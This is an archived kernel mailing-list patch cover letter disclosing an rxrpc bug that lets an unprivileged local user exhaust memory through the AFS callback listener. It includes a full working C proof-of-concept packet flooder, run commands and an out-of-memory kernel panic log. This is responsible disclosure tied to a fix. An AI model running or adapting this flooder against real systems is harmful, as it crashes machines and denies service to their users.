Received: from mail-pf1-f172.google.com (mail-pf1-f172.google.com [209.85.210.172])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8059047D473
	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:43:44 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.172
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784828637; cv=none; b=WYTFWGkIhM7o295gaUUb3R7n7/BkESLaAmg8oCpT71g6AGDBRraskRoallo7LdoAspG0X1vnflXaskxwzdeUoXRs1Q4VAIxhsRIT2dGNv056c3lneB9iGiONLFHJezv+G5xQWKoYSKTZ4WSKSgdlE+zLWR99AKNN1f37H9FCRLc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784828637; c=relaxed/simple;
	bh=q68F91SeNHJbNhvx8J8p8wAs4M14Ilv2/hyXsjtz8ns=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=JsafuedtEfgzj3hPNavUuEWbD4oZN0eWMalygq15VJ+jSkSFjcjjSMu2fOohvNMh+UZpYeJgYXz2VCCLgwVCKsr7ZE/l8WhTzIL1+9T1Q2UC5P67tb0tE5KBChBkaUdspJn3unuO8ONh11/ndLKID2ad6378FjB/WThpZP4YwpE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=DeWl524N; arc=none smtp.client-ip=209.85.210.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="DeWl524N"
Received: by mail-pf1-f172.google.com with SMTP id d2e1a72fcca58-84847482584so592882b3a.0
        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:43:43 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784828620; x=1785433420; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=5W5Brm82Q3ur/hmI1cbX48Q7nKnL6HYdH6feeYxRiUw=;
        b=DeWl524Nbcl11WJGTGrTE7vJ2NNuNtV5In2tCBeeXwB9fXLrkjhZD2iL/TQeGcdTxw
         2MhaAuJD1tf6/rKNAi+EIfC7tZ/X+n92oM1YpCZdP3F0cc/f+NdcObLa+hnKDTlFSYXq
         tzBxWWJv8duvg3kYl5ciIJEgvphNutPTWiRsLj0qUpouVH40SWIZxnsbg2rUgS6U4uqg
         Iay98pTUNc1Od4NFlyTCGb1yo0lRmpgFs5hEGs5VSoFq9In0oUj54N8DFiBo1DZsW71U
         un8odB9HWjeWlVuZlKxRLqHoIKLvAPxNxWHdUGuKvA4KkavYalNJQZRGlGWBB6ZMkVys
         zoaw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784828620; x=1785433420;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=5W5Brm82Q3ur/hmI1cbX48Q7nKnL6HYdH6feeYxRiUw=;
        b=P+sn4/PmaX9AUFhTJR86Y1TyBmf6PHThmyxn+HVVZ53tiQujUsvKqFctZUEytprBn1
         sHPBaVsXkhIq8Zhk5qPYSPX4/0XHmMqwLnaR8QzvNNMzg8oV8kn24/yNxxilyumz7fN3
         G0p6WLi1oY86p520L/5MgCobchgste98DUgtBbTj7OjWx5gdBZ+KStWOsE9zD405fWhK
         WK/9hYfsNHCQmkyjj2szRNlUeu3zBeMj5Etyifro5w3WFuIqoVscWepcKyqQk7/3a2kC
         0onli/loUMeL3FZF/5NUAgvkE4wOkzKN91VjUY1glrystA3Ct8EQ3Iv0v1sip2uIm+bZ
         5PXw==
X-Forwarded-Encrypted: i=1; AHgh+RqjvaH7r5tHtOPi8fckoFQDdMRc8b/pUL5SO1kPkxObKVfUYZMXsX+d0akJDIDuOcFhjYwLFVs=@vger.kernel.org
X-Gm-Message-State: AOJu0YwtqfPMm/Jpn22dZih+FewfY+GT2AXkSTP5r8aYnlr0YzlD1JpV
	ItNqhWJcXcE/JNJ90GD2nTFPSXIKsraSlVjnnRMeJ0q7Gi8H6hCajWPlIZBPc65K+MI=
X-Gm-Gg: AR+sD10MM8fbnzuaGFxwTrz+o90+aAOeYMzopHv60WTFJs4Q0oxkab03+DjVbiXt779
	0XSK+wzFTOkpRxCDwuvMIvF0CFklVDt2WpvAkzZjAdQL7kCA9+ok6kNrIUVyeX4ZViWyMPZpYTq
	1XnGCjvwSNC0m+Vhy06209yaR1paC6dMNWNFO+Jq0NMjZRyXCj7teRcNh1m/x4os8JKdy5eU9Ln
	NEKmywTWi9yFKrKwbSL6f3plWiiwX0G5pzBEH+ON601y7Pv9QbVmQ3ucoo59XHftBfMnYy0EA19
	3GjmCqKrDEE/yDOCXbrTS1T5uppOfdFW75M1pXkUqPElAtuOUB5SpXRlZ+C/g/jSHQr1Js+m8Zh
	d6occJ/iKcQqio1O9klimJYPUyrAC0SoUj9PvO9nbq0Tj+w9ioJv2/PQt0Td8kvqYU2vvbhZoOA
	qQN9Ce1QDHTG74MWqzOis=
X-Received: by 2002:a05:6a00:368b:b0:84a:29af:a0eb with SMTP id d2e1a72fcca58-84e2e83fac3mr3957679b3a.9.1784828620416;
        Thu, 23 Jul 2026 10:43:40 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e175cdc21sm3425111b3a.47.2026.07.23.10.43.33
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 23 Jul 2026 10:43:40 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-afs@lists.infradead.org,
	netdev@vger.kernel.org
Cc: dhowells@redhat.com,
	marc.dionne@auristor.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zihanx@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] rxrpc: fix encap_rcv skb accounting exhaustion
Date: Fri, 24 Jul 2026 01:43:27 +0800
Message-ID: <cover.1784742007.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

From: Zihan Xi <zihanx@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/rxrpc/io_thread.c. The bug is
reachable by an unprivileged local user via the in-kernel AFS callback
listener on [::]:7001. We've tested it, and it should not affect any
other functionality.

This series contains one patch:
  1/1 rxrpc: fix encap_rcv skb accounting exhaustion

We provide bug details, reproducer steps, and a crash log below.

---- details below ----

Bug details:

rxrpc_encap_rcv() removes encapsulated UDP packets from the UDP receive
path and queues them on the RxRPC local queue without preserving UDP
receive-buffer accounting. A local AF_RXRPC service such as the AFS
callback listener can therefore be flooded with RxRPC-shaped UDP
packets until the RxRPC receive buffers grow without bound.

The attached patch reaccounts each encapsulated skb against the UDP
socket before it is queued on the RxRPC local queue and drops packets
once the socket rcvbuf limit is exhausted. It also clears sk_user_data
under RCU protection and defers socket release until queued skbs are
purged so the new skb ownership cannot outlive the UDP socket.

On the unfixed kernel, the reproducer drove /proc/net/rxrpc to:
  - Buffers: rxb=3D152399
  - RxQ=3D46041

On the fixed kernel under the same workload, packet reception continued
but:
  - Buffers: rxb=3D0
  - RxQ=3D0

Reproducer:

    Host:
      gcc -static -O2 -pthread -o poc.static poc.c

    Guest:
      sysctl -w kernel.panic_on_warn=3D0
      sysctl -w vm.panic_on_oom=3D1
      sysctl -w vm.overcommit_memory=3D2
      sysctl -w vm.overcommit_ratio=3D50
      ./poc -t 16 -s 60 -l 8
      ./poc -t 32 -s 120 -l 8

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------=0D
#define _GNU_SOURCE=0D
#include <arpa/inet.h>=0D
#include <errno.h>=0D
#include <netinet/in.h>=0D
#include <pthread.h>=0D
#include <sched.h>=0D
#include <signal.h>=0D
#include <stdint.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/socket.h>=0D
#include <sys/types.h>=0D
#include <time.h>=0D
#include <unistd.h>=0D
=0D
#define RXRPC_PACKET_TYPE_DATA 1=0D
#define RXRPC_CLIENT_INITIATED 0x01=0D
#define RXRPC_SERVICE_ID 1=0D
#define AFS_CB_CALLBACK_OP 204=0D
#define DEFAULT_PORT 7001=0D
#define DEFAULT_THREADS 4=0D
#define DEFAULT_SECONDS 20=0D
#define DEFAULT_PAYLOAD 8=0D
=0D
struct __attribute__((packed)) rxrpc_wire_header {=0D
	uint32_t epoch;=0D
	uint32_t cid;=0D
	uint32_t callNumber;=0D
	uint32_t seq;=0D
	uint32_t serial;=0D
	uint8_t type;=0D
	uint8_t flags;=0D
	uint8_t userStatus;=0D
	uint8_t securityIndex;=0D
	uint16_t reserved;=0D
	uint16_t serviceId;=0D
};=0D
=0D
struct thread_args {=0D
	struct sockaddr_in6 dst;=0D
	int seconds;=0D
	size_t payload_len;=0D
	uint32_t cid_seed;=0D
	unsigned long sent;=0D
};=0D
=0D
static volatile sig_atomic_t stop_flag;=0D
=0D
static void on_alarm(int sig)=0D
{=0D
	(void)sig;=0D
	stop_flag =3D 1;=0D
}=0D
=0D
static void *sender_thread(void *arg)=0D
{=0D
	struct thread_args *ta =3D arg;=0D
	int fd;=0D
	char *packet;=0D
	struct rxrpc_wire_header *hdr;=0D
	uint32_t *op;=0D
	uint32_t *count;=0D
	uint32_t seq =3D 1;=0D
=0D
	fd =3D socket(AF_INET6, SOCK_DGRAM, 0);=0D
	if (fd < 0) {=0D
		perror("socket");=0D
		return NULL;=0D
	}=0D
=0D
	packet =3D malloc(sizeof(*hdr) + ta->payload_len);=0D
	if (!packet) {=0D
		perror("malloc");=0D
		close(fd);=0D
		return NULL;=0D
	}=0D
	memset(packet + sizeof(*hdr), 0, ta->payload_len);=0D
	hdr =3D (struct rxrpc_wire_header *)packet;=0D
	hdr->epoch =3D htonl(0x80000000u | (ta->cid_seed & 0x7fffffffu));=0D
	hdr->cid =3D htonl((ta->cid_seed << 2) | 0);=0D
	hdr->callNumber =3D htonl(1);=0D
	hdr->type =3D RXRPC_PACKET_TYPE_DATA;=0D
	hdr->flags =3D RXRPC_CLIENT_INITIATED;=0D
	hdr->userStatus =3D 0;=0D
	hdr->securityIndex =3D 0;=0D
	hdr->reserved =3D 0;=0D
	hdr->serviceId =3D htons(RXRPC_SERVICE_ID);=0D
	op =3D (uint32_t *)(packet + sizeof(*hdr));=0D
	*op =3D htonl(AFS_CB_CALLBACK_OP);=0D
	if (ta->payload_len >=3D 8) {=0D
		count =3D op + 1;=0D
		*count =3D htonl(1);=0D
	}=0D
=0D
	while (!stop_flag) {=0D
		hdr->seq =3D htonl(seq);=0D
		hdr->serial =3D htonl(seq);=0D
		if (sendto(fd, packet, sizeof(*hdr) + ta->payload_len, 0,=0D
			   (struct sockaddr *)&ta->dst, sizeof(ta->dst)) >=3D 0) {=0D
			ta->sent++;=0D
			seq++;=0D
		}=0D
	}=0D
=0D
	free(packet);=0D
	close(fd);=0D
	return NULL;=0D
}=0D
=0D
static void usage(const char *prog)=0D
{=0D
	fprintf(stderr, "Usage: %s [-a addr] [-p port] [-t threads] [-s seconds] [=
-l payload_len]\n", prog);=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	struct sockaddr_in6 dst =3D {=0D
		.sin6_family =3D AF_INET6,=0D
		.sin6_port =3D htons(DEFAULT_PORT),=0D
	};=0D
	const char *addr =3D "::1";=0D
	int threads =3D DEFAULT_THREADS;=0D
	int seconds =3D DEFAULT_SECONDS;=0D
	size_t payload_len =3D DEFAULT_PAYLOAD;=0D
	pthread_t *tids;=0D
	struct thread_args *args;=0D
	unsigned long total =3D 0;=0D
	int opt;=0D
=0D
	while ((opt =3D getopt(argc, argv, "a:p:t:s:l:h")) !=3D -1) {=0D
		switch (opt) {=0D
		case 'a':=0D
			addr =3D optarg;=0D
			break;=0D
		case 'p':=0D
			dst.sin6_port =3D htons((uint16_t)strtoul(optarg, NULL, 0));=0D
			break;=0D
		case 't':=0D
			threads =3D atoi(optarg);=0D
			break;=0D
		case 's':=0D
			seconds =3D atoi(optarg);=0D
			break;=0D
		case 'l':=0D
			payload_len =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		default:=0D
			usage(argv[0]);=0D
			return 1;=0D
		}=0D
	}=0D
=0D
	if (threads <=3D 0 || seconds <=3D 0 || payload_len < 4 || payload_len > 6=
5000) {=0D
		usage(argv[0]);=0D
		return 1;=0D
	}=0D
	if (inet_pton(AF_INET6, addr, &dst.sin6_addr) !=3D 1) {=0D
		perror("inet_pton");=0D
		return 1;=0D
	}=0D
=0D
	signal(SIGALRM, on_alarm);=0D
	alarm(seconds);=0D
=0D
	tids =3D calloc((size_t)threads, sizeof(*tids));=0D
	args =3D calloc((size_t)threads, sizeof(*args));=0D
	if (!tids || !args) {=0D
		perror("calloc");=0D
		return 1;=0D
	}=0D
=0D
	for (int i =3D 0; i < threads; i++) {=0D
		args[i].dst =3D dst;=0D
		args[i].seconds =3D seconds;=0D
		args[i].payload_len =3D payload_len;=0D
		args[i].cid_seed =3D 1 + (uint32_t)i;=0D
		if (pthread_create(&tids[i], NULL, sender_thread, &args[i]) !=3D 0) {=0D
			fprintf(stderr, "pthread_create(%d) failed: %s\n", i, strerror(errno));=
=0D
			stop_flag =3D 1;=0D
			threads =3D i;=0D
			break;=0D
		}=0D
	}=0D
=0D
	for (int i =3D 0; i < threads; i++) {=0D
		pthread_join(tids[i], NULL);=0D
		total +=3D args[i].sent;=0D
	}=0D
=0D
	printf("sent_packets=3D%lu payload_len=3D%zu threads=3D%d duration=3D%d\n"=
,=0D
	       total, payload_len, threads, seconds);=0D
	free(args);=0D
	free(tids);=0D
	return 0;=0D
}=0D
=0D
------END poc.c--------=0D
=0D
----BEGIN crash log----=0D
=0D
[  374.868900][T10021] Kernel panic - not syncing: Out of memory: system-wi=
de panic_on_oom is enabled=0D
[  374.869593][T10021] CPU: 0 UID: 1028 PID: 10021 Comm: poc_rxrpc_mem Not =
tainted 7.1.0-rc1 #2 PREEMPT(full)=0D
[  374.870253][T10021] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, =
1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[  374.870955][T10021] Call Trace:=0D
[  374.871183][T10021]  <TASK>=0D
[374.871397][T10021] vpanic+0x6c3/0x790 =0D
[374.871684][T10021] ? __pfx_vpanic+0x10/0x10 =0D
[374.871994][T10021] panic (/var/cache/linux-patch/vsock-accept-leak-src/ke=
rnel/panic.c:285) =0D
[374.872312][T10021] ? __pfx_panic (/var/cache/linux-patch/vsock-accept-lea=
k-src/kernel/panic.c:277) =0D
[374.872754][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.873186][T10021] out_of_memory (/var/cache/linux-patch/vsock-accept-lea=
k-src/mm/oom_kill.c:298 /var/cache/linux-patch/vsock-accept-leak-src/mm/oom=
_kill.c:1150) =0D
[374.873559][T10021] ? __pfx_out_of_memory (/var/cache/linux-patch/vsock-ac=
cept-leak-src/mm/oom_kill.c:1114) =0D
[374.873931][T10021] __alloc_frozen_pages_noprof+0x2306/0x2af0 =0D
[374.874497][T10021] ? __pfx___alloc_frozen_pages_noprof+0x10/0x10 =0D
[374.874991][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.875378][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.875759][T10021] ? find_held_lock (/var/cache/linux-patch/vsock-accept-=
leak-src/kernel/locking/lockdep.c:5237) =0D
[374.876091][T10021] ? lock_acquire (/var/cache/linux-patch/vsock-accept-le=
ak-src/kernel/locking/lockdep.c:5754 /var/cache/linux-patch/vsock-accept-le=
ak-src/kernel/locking/lockdep.c:5719) =0D
[374.876429][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.876802][T10021] ? find_held_lock (/var/cache/linux-patch/vsock-accept-=
leak-src/kernel/locking/lockdep.c:5237) =0D
[374.877129][T10021] alloc_pages_mpol+0x14a/0x440 =0D
[374.877462][T10021] ? __pfx_alloc_pages_mpol+0x10/0x10 =0D
[374.877815][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.878193][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.878616][T10021] ? __check_object_size (/var/cache/linux-patch/vsock-ac=
cept-leak-src/mm/usercopy.c:144 (discriminator 1) /var/cache/linux-patch/vs=
ock-accept-leak-src/mm/usercopy.c:254 (discriminator 1) /var/cache/linux-pa=
tch/vsock-accept-leak-src/mm/usercopy.c:213 (discriminator 1)) =0D
[374.878973][T10021] alloc_pages_noprof+0x10/0x110 =0D
[374.879314][T10021] skb_page_frag_refill (/var/cache/linux-patch/vsock-acc=
ept-leak-src/net/core/sock.c:2944) =0D
[374.879666][T10021] sk_page_frag_refill (/var/cache/linux-patch/vsock-acce=
pt-leak-src/net/core/sock.c:2976) =0D
[374.880012][T10021] __ip6_append_data+0xeea/0x4db0 =0D
[374.880373][T10021] ? __pfx_ip_generic_getfrag (/var/cache/linux-patch/vso=
ck-accept-leak-src/net/ipv4/ip_output.c:940) =0D
[374.880767][T10021] ? __pfx___ip6_append_data+0x10/0x10 =0D
[374.881124][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.881501][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.881868][T10021] ? ip6_setup_cork (/var/cache/linux-patch/vsock-accept-=
leak-src/net/ipv6/ip6_output.c:1386 (discriminator 1)) =0D
[374.882286][T10021] ip6_make_skb (/var/cache/linux-patch/vsock-accept-leak=
-src/net/ipv6/ip6_output.c:2052) =0D
[374.882692][T10021] ? __pfx_ip_generic_getfrag (/var/cache/linux-patch/vso=
ck-accept-leak-src/net/ipv4/ip_output.c:940) =0D
[374.883077][T10021] ? __pfx_ip6_make_skb (/var/cache/linux-patch/vsock-acc=
ept-leak-src/net/ipv6/ip6_output.c:2034) =0D
[374.883479][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.883888][T10021] ? find_held_lock (/var/cache/linux-patch/vsock-accept-=
leak-src/kernel/locking/lockdep.c:5237) =0D
[374.884290][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.884704][T10021] ? udpv6_sendmsg (/var/cache/linux-patch/vsock-accept-l=
eak-src/include/net/net_namespace.h:402 (discriminator 7) /var/cache/linux-=
patch/vsock-accept-leak-src/include/net/sock.h:657 (discriminator 7) /var/c=
ache/linux-patch/vsock-accept-leak-src/include/net/ipv6.h:415 (discriminato=
r 7) /var/cache/linux-patch/vsock-accept-leak-src/net/ipv6/udp.c:1446 (disc=
riminator 7)) =0D
[374.885080][T10021] udpv6_sendmsg (/var/cache/linux-patch/vsock-accept-lea=
k-src/include/net/net_namespace.h:402 (discriminator 7) /var/cache/linux-pa=
tch/vsock-accept-leak-src/include/net/sock.h:657 (discriminator 7) /var/cac=
he/linux-patch/vsock-accept-leak-src/include/net/ipv6.h:415 (discriminator =
7) /var/cache/linux-patch/vsock-accept-leak-src/net/ipv6/udp.c:1446 (discri=
minator 7)) =0D
[374.885425][T10021] ? __pfx_udpv6_sendmsg (/var/cache/linux-patch/vsock-ac=
cept-leak-src/net/ipv6/udp.c:1331) =0D
[374.885759][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.886131][T10021] ? tomoyo_check_inet_address (/var/cache/linux-patch/vs=
ock-accept-leak-src/security/tomoyo/network.c:472 (discriminator 1) /var/ca=
che/linux-patch/vsock-accept-leak-src/security/tomoyo/network.c:532 (discri=
minator 1)) =0D
[374.886535][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.886903][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.887276][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.887672][T10021] ? __pfx_aa_sk_perm+0x10/0x10 =0D
[374.888008][T10021] ? __sys_sendto (/var/cache/linux-patch/vsock-accept-le=
ak-src/include/linux/file.h:33 /var/cache/linux-patch/vsock-accept-leak-src=
/net/socket.c:2204) =0D
[374.888340][T10021] __sys_sendto (/var/cache/linux-patch/vsock-accept-leak=
-src/include/linux/file.h:33 /var/cache/linux-patch/vsock-accept-leak-src/n=
et/socket.c:2204) =0D
[374.888635][T10021] ? __pfx___sys_sendto (/var/cache/linux-patch/vsock-acc=
ept-leak-src/net/socket.c:2170) =0D
[374.888978][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.889369][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.889726][T10021] ? xfd_validate_state (/var/cache/linux-patch/vsock-acc=
ept-leak-src/arch/x86/kernel/fpu/xstate.c:1421 /var/cache/linux-patch/vsock=
-accept-leak-src/arch/x86/kernel/fpu/xstate.c:1465) =0D
[374.890059][T10021] ? xfd_validate_state (/var/cache/linux-patch/vsock-acc=
ept-leak-src/arch/x86/kernel/fpu/xstate.c:1421 /var/cache/linux-patch/vsock=
-accept-leak-src/arch/x86/kernel/fpu/xstate.c:1465) =0D
[374.890405][T10021] __x64_sys_sendto (/var/cache/linux-patch/vsock-accept-=
leak-src/net/socket.c:2209) =0D
[374.890805][T10021] ? do_syscall_64 (/var/cache/linux-patch/vsock-accept-l=
eak-src/arch/x86/entry/common.c:62 (discriminator 4) /var/cache/linux-patch=
/vsock-accept-leak-src/arch/x86/entry/common.c:76 (discriminator 4)) =0D
[374.891199][T10021] ? srso_alias_return_thunk (/var/cache/linux-patch/vsoc=
k-accept-leak-src/arch/x86/lib/retpoline.S:175) =0D
[374.891568][T10021] ? lockdep_hardirqs_on (/var/cache/linux-patch/vsock-ac=
cept-leak-src/kernel/locking/lockdep.c:4421) =0D
[374.891908][T10021] do_syscall_64 (/var/cache/linux-patch/vsock-accept-lea=
k-src/arch/x86/entry/common.c:199) =0D
[374.892319][T10021] ? irqentry_exit (/var/cache/linux-patch/vsock-accept-l=
eak-src/include/linux/context_tracking.h:131 (discriminator 3) /var/cache/l=
inux-patch/vsock-accept-leak-src/kernel/context_tracking.c:91 (discriminato=
r 3)) =0D
[374.892664][T10021] entry_SYSCALL_64_after_hwframe (/var/cache/linux-patch=
/vsock-accept-leak-src/arch/x86/entry/entry_64.S:121) =0D
[  374.893158][T10021] RIP: 0033:0x7fcec98fb9ee=0D
[ 374.893546][T10021] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7=
 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f=
 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08=0D
All code=0D
=3D=3D=3D=3D=3D=3D=3D=3D=0D
   0:	08 0f                	or     %cl,(%rdi)=0D
   2:	85 f5                	test   %esi,%ebp=0D
   4:	4b ff                	rex.WXB (bad)=0D
   6:	ff 49 89             	decl   -0x77(%rcx)=0D
   9:	fb                   	sti=0D
   a:	48 89 f0             	mov    %rsi,%rax=0D
   d:	48 89 d7             	mov    %rdx,%rdi=0D
  10:	48 89 ce             	mov    %rcx,%rsi=0D
  13:	4c 89 c2             	mov    %r8,%rdx=0D
  16:	4d 89 ca             	mov    %r9,%r10=0D
  19:	4c 8b 44 24 08       	mov    0x8(%rsp),%r8=0D
  1e:	4c 8b 4c 24 10       	mov    0x10(%rsp),%r9=0D
  23:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)=0D
  28:	0f 05                	syscall=0D
  2a:*	c3                   	ret		<-- trapping instruction=0D
  2b:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)=0D
  32:	00 00 00 =0D
  35:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)=0D
  3c:	48 83 ec 08          	sub    $0x8,%rsp=0D
=0D
Code starting with the faulting instruction=0D
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=0D
   0:	c3                   	ret=0D
   1:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)=0D
   8:	00 00 00 =0D
   b:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)=0D
  12:	48 83 ec 08          	sub    $0x8,%rsp=0D
[  374.894971][T10021] RSP: 002b:00007fcec07fee08 EFLAGS: 00000246 ORIG_RAX=
: 000000000000002c=0D
[  374.895515][T10021] RAX: ffffffffffffffda RBX: 00007fcec07ff6c0 RCX: 000=
07fcec98fb9ee=0D
[  374.896024][T10021] RDX: 000000000000fe04 RSI: 00007fceb0000b70 RDI: 000=
0000000000005=0D
[  374.896545][T10021] RBP: 000055f531372350 R08: 000055f531372350 R09: 000=
000000000001c=0D
[  374.897055][T10021] R10: 0000000000000000 R11: 0000000000000246 R12: 000=
0000000000005=0D
[  374.897565][T10021] R13: 0000000097850000 R14: 0000000000008597 R15: 000=
07fcebffff000=0D
[  374.898159][T10021]  </TASK>=0D
[  374.898988][T10021] Kernel Offset: disabled=0D
[  374.899323][T10021] Rebooting in 86400 seconds..=0D
=0D
-----END crash log-----=0D
=0D
Best regards,=0D
Zihan Xi=0D
=0D
Zihan Xi (1):=0D
  rxrpc: fix encap_rcv skb accounting exhaustion=0D
=0D
 net/rxrpc/io_thread.c    | 15 +++++++++++++--=0D
 net/rxrpc/local_object.c |  8 ++++++--=0D
 2 files changed, 19 insertions(+), 4 deletions(-)=0D
=0D
-- =0D
